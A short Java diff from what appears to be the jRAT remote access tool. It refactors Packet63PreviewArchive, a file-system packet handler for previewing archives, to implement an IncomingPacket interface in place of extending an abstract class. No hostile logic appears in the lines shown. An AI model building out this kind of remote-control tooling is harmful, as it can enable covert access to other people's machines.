@@ -1,7 +1,7 @@
 package jrat.module.fs.packets;
 
 import jrat.client.Connection;
-import jrat.client.packets.incoming.AbstractIncomingPacket;
+import jrat.client.packets.incoming.IncomingPacket;
 
 import java.util.ArrayList;
 import java.util.Enumeration;
@@ -10,7 +10,7 @@ import java.util.zip.ZipEntry;
 import java.util.zip.ZipFile;
 
 
-public class Packet63PreviewArchive extends AbstractIncomingPacket {
+public class Packet63PreviewArchive implements IncomingPacket {
 
 	@Override
 	public void read(Connection con) throws Exception {
